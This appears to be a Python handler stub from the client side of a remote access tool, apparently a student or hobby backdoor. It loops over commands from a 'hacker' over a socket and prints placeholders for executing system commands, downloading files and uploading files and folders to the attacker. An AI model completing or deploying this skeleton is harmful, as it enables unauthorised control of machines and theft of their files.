

def handleConnection(my_socket):
    print("[+] Handling Connection")
    keep_alive = True
    while keep_alive:
        user_option = my_socket.receive_data()
        print("[+] hacker selected option = ", user_option)
        if user_option == "1":
            print("\t\t[+] Executing System Commands")
        elif user_option == "2":
            print("\t\t[+] Downloading Files from hacker")
        elif user_option == "3":
            print("\t\t[+] Uploading Files to hacker")
        elif user_option == "4":
            print("\t\t[+] Uploading Folders to hacker")
        elif user_option == "99":
            print("\t\t[-] Exiting the main loop")
            keep_alive = False
        else:
            print("\t\t[-] Invalid input, try again")